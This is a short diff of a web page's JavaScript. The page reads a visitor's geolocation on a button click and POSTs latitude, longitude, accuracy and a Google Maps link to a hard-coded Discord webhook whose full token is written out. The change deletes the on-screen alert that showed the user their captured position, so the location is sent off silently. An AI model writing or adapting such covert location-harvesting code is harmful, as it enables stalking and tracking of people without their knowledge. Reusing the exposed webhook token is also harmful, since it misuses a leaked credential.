@@ -105,11 +105,6 @@ document.getElementById("locBtn").addEventListener("click", () => {
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            alert(`✔ Position obtenue !
-Latitude : ${lat}
-Longitude : ${lon}
-Précision : ${acc} mètres`);
-
             // ⭐ Envoi au webhook Discord ⭐
             fetch("https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb", {
                 method: "POST",
@@ -158,6 +153,7 @@ https://www.google.com/maps?q=${lat},${lon}`,
 
 </body>
 </html>
+
 
 
 
